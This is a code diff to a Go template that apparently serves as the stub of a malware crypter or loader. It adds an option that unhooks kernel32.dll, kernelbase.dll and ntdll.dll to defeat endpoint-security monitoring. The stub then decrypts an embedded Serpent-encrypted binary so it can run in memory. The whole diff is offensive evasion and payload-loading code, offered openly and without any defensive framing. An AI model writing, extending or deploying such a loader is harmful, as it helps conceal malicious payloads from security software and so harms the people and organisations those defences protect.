@@ -5,12 +5,16 @@ import (
 	//{{if .Debug}}
 	"log"
 	//{{end}}
-	"github.com/coremedic/goldr/crypter"
+	"github.com/coremedic/goldr/pkg/crypter"
 
 	//{{if .Memexec}}
 	"os/exec"
 
 	"github.com/amenzhinsky/go-memexec"
+	//{{end}}
+
+	//{{if .Unhook}}
+	"github.com/coremedic/goldr/pkg/evasion"
 	//{{end}}
 )
 
@@ -22,6 +26,30 @@ var (
 )
 
 func main() {
+	//{{if .Unhook}}
+	err := evasion.UnHookDll(`c:\windows\system32\kernel32.dll`)
+	if err != nil {
+		//{{if .Debug}}
+		log.Printf("Failed to unhook kernel32: %s\n", err.Error())
+		//{{end}}
+		return
+	}
+	err = evasion.UnHookDll(`c:\windows\system32\kernelbase.dll`)
+	if err != nil {
+		//{{if .Debug}}
+		log.Printf("Failed to unhook kernelbase: %s\n", err.Error())
+		//{{end}}
+		return
+	}
+	err = evasion.UnHookDll(`c:\windows\system32\ntdll.dll`)
+	if err != nil {
+		//{{if .Debug}}
+		log.Printf("Failed to unhook ntdll: %s\n", err.Error())
+		//{{end}}
+		return
+	}
+	//{{end}}
+
 	//{{if .Memexec}}
 	bin, err := crypter.SerpentDecrypt(cryptbin, key)
 	if err != nil {
